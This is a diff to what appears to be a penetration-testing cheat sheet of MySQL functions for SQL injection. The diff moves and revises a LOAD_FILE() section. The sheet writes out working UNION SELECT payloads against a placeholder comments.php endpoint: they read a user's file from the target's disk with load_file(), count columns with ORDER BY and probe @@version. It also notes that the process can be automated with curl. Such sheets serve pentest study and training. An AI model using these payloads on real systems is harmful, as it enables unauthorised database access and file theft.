@@ -1,11 +1,5 @@
 # MySQL Functions
 This sheet serves as a list of functions to be leveraged during a successful MySQL SQL injection attack.
-## LOAD_FILE()
-We may be able to read files on the target file system using the MySQL `load_file()` function like so,
-```
-https://127.0.0.1/comments.php?id=1337 union all select 1,2,3,4,load_file("C:\users\username\Desktop\user.txt"), 6
-```
-Becareful about how you use single and double quotes. We must know where the file resides on the file system before attmpting to read it.
 ## ORDER BY
 We can oftent use the SQL statement `ORDER BY` to gather how many columns the current database table has,
 ```
@@ -24,6 +18,12 @@ https://127.0.0.1/comments.php?id=1337 UNION ALL SELECT 1,1,1,1,1,@@version,1
 https://127.0.0.1/comments.php?id=1337 UNION ALL SELECT 1,1,1,1,1,1,@@version
 ```
 This can easily be automated by scripting the process using `curl`.
+## LOAD_FILE()
+Once we determine the column count and injectable parameter, we may be able to read files on the target file system using the MySQL `load_file()` function like so,
+```
+https://127.0.0.1/comments.php?id=1337 union all select 1,2,3,4,load_file("C:\users\username\Desktop\user.txt"),6,7
+```
+Becareful about how you use single and double quotes. We must know where the file resides on the file system before attmpting to read it. This also assumes that we can inject nested SQL statements on column `5`.
 ## GROUP CONCAT
 Group concatenation of records can be achieved using the `GROUP_CONCAT` stored procedure in MySQL,
 ```
